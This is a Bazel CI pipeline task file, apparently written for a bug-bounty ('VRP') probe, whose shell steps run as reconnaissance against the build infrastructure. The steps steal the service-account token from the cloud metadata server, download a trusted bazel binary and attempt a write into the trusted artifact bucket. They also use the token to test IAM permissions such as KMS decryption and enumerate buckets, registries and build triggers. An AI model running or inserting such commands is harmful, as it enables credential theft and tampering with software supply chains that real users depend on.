---
tasks:
  vrp_deep_dive:
    name: "VRP Deep Dive"
    platform: ubuntu2204
    shell_commands:
      - "set +e"
      - "echo === VRP Round 4: Trusted Artifacts Deep Dive ==="
      - "T=$(curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | python3 -c 'import sys,json;print(json.load(sys.stdin)[\"access_token\"])')"
      - "echo"
      - "echo === 1. Stat the trusted bazel binary ==="
      - "gsutil stat gs://bazel-trusted-buildkite-artifacts/fffaccd0-be41-4833-aff9-eb6ce5389a82/bazel-bin/src/bazel 2>&1 || true"
      - "echo"
      - "echo === 2. Download and hash the trusted bazel binary ==="
      - "gsutil cp gs://bazel-trusted-buildkite-artifacts/fffaccd0-be41-4833-aff9-eb6ce5389a82/bazel-bin/src/bazel /tmp/trusted-bazel 2>&1 || true"
      - "ls -la /tmp/trusted-bazel 2>&1 || true"
      - "sha256sum /tmp/trusted-bazel 2>&1 || true"
      - "file /tmp/trusted-bazel 2>&1 || true"
      - "echo"
      - "echo === 3. Test WRITE access to trusted bucket ==="
      - "echo VRP-WRITE-TEST > /tmp/vrp-test.txt"
      - "gsutil cp /tmp/vrp-test.txt gs://bazel-trusted-buildkite-artifacts/vrp-write-test.txt 2>&1 || true"
      - "echo"
      - "echo === 4. Get trusted bucket IAM policy ==="
      - "gsutil iam get gs://bazel-trusted-buildkite-artifacts/ 2>&1 || true"
      - "echo"
      - "echo === 5. Check bazel-trusted bucket ==="
      - "gsutil ls gs://bazel-trusted/ 2>&1 || true"
      - "echo"
      - "echo === 6. Check bazel-public bucket ==="
      - "gsutil ls gs://bazel-public/ 2>&1 || true"
      - "echo"
      - "echo === 7. Check bazel bucket ==="
      - "gsutil ls gs://bazel/ 2>&1 || true"
      - "echo"
      - "echo === 8. Check bazel-releases bucket ==="
      - "gsutil ls gs://bazel-releases/ 2>&1 || true"
      - "echo"
      - "echo === 9. testIamPermissions on bazel-public ==="
      - "curl -s -X POST -H \"Authorization: Bearer $T\" -H 'Content-Type: application/json' -d '{\"permissions\":[\"storage.buckets.list\",\"storage.objects.list\",\"storage.objects.get\",\"storage.objects.create\",\"cloudkms.cryptoKeys.list\",\"cloudkms.cryptoKeyVersions.useToDecrypt\",\"resourcemanager.projects.get\",\"iam.serviceAccounts.list\",\"cloudbuild.builds.list\",\"artifactregistry.repositories.list\"]}' 'https://cloudresourcemanager.googleapis.com/v1/projects/bazel-public:testIamPermissions' 2>&1 | python3 -m json.tool || true"
      - "echo"
      - "echo === 10. Container Registry bazel-public ==="
      - "gsutil ls gs://artifacts.bazel-public.appspot.com/ 2>&1 || true"
      - "echo"
      - "echo === 11. Container Registry bazel-untrusted ==="
      - "gsutil ls gs://artifacts.bazel-untrusted.appspot.com/ 2>&1 || true"
      - "echo"
      - "echo === 12. Release buckets scan ==="
      - "gsutil ls gs://bazel-apt/ 2>&1 || true"
      - "gsutil ls gs://bazel-mirror/ 2>&1 || true"
      - "gsutil ls gs://bazel-archive/ 2>&1 || true"
      - "gsutil ls gs://bazel-binaries/ 2>&1 || true"
      - "gsutil ls gs://bazel-coverage/ 2>&1 || true"
      - "gsutil ls gs://bazel-snapshots/ 2>&1 || true"
      - "echo"
      - "echo === 13. GCR images ==="
      - "gcloud container images list --repository=gcr.io/bazel-public --quiet 2>&1 || true"
      - "echo"
      - "echo === 14. GCR images untrusted ==="
      - "gcloud container images list --repository=gcr.io/bazel-untrusted --quiet 2>&1 || true"
      - "echo"
      - "echo === 15. Artifact Registry bazel-public ==="
      - "gcloud artifacts repositories list --project bazel-public --quiet 2>&1 || true"
      - "echo"
      - "echo === 16. Cloud Build triggers ==="
      - "gcloud builds triggers list --project bazel-untrusted --quiet 2>&1 || true"
      - "gcloud builds triggers list --project bazel-public --quiet 2>&1 || true"
      - "echo"
      - "echo === 17. List more trusted artifact dirs ==="
      - "gsutil ls gs://bazel-trusted-buildkite-artifacts/ 2>&1 | tail -5 || true"
      - "echo"
      - "echo === 18. Check another trusted artifact ==="
      - "gsutil ls -r gs://bazel-trusted-buildkite-artifacts/ffff3095-c60a-45d3-93f8-254c3e8eeb28/ 2>&1 || true"
      - "echo === DONE ==="
    build_targets:
      - "//..."
